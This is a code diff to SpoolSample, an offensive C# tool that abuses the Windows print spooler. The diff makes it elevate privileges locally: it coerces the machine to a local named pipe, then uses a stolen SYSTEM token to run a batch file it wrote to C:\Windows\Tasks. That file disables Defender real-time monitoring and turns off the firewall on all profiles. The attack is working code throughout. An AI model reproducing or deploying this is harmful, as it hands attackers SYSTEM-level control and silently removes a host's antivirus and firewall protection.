@@ -3,6 +3,8 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using RDI;
+using System.IO;
+
 
 namespace SpoolSample
 {
@@ -84,28 +86,31 @@ namespace SpoolSample
         // FYI, there might be reliability issues with this. The MS-RPRN project is more reliable 
         static void Main(string[] args)
         {
-            if (args.Length != 2)
-            {
-                Console.WriteLine("Invalid number of args. Syntax: SpoolSample.exe TARGET CAPTURESERVER");
-                return;
-            }
+
+            var loc = "C:\\Windows\\Tasks\\turn_off.bat";
+            string inform = "powershell Set-MpPreference -DisableRealtimeMonitoring $true \nNetSh Advfirewall set allprofiles state off";
+            File.WriteAllText(loc, inform);
 
 
             Thread t = new Thread(WriteY);          
             t.Start();
             
             
-            System.Threading.Thread.Sleep(2000);
+            System.Threading.Thread.Sleep(500);
 
-            Thread z = new Thread(() => WriteZ(args));
+            Thread z = new Thread(WriteZ);
             z.Start();
            
         }
 
 
-        static void WriteZ(string[] args)
+        static void WriteZ()
         {
-            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{args[0]} \\\\{args[1]}");
+            string arg1 = Environment.MachineName.ToString();
+
+            string arg2 = arg1 + "/pipe/test";
+
+            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{arg1} \\\\{arg2}");
 
             RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
         }
@@ -144,6 +149,7 @@ namespace SpoolSample
             STARTUPINFO si = new STARTUPINFO();
             si.cb = Marshal.SizeOf(si);
             CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\Tasks\\turn_off.bat", 0, IntPtr.Zero, null, ref si, out pi);
+            System.Environment.Exit(0);
         }
 
 
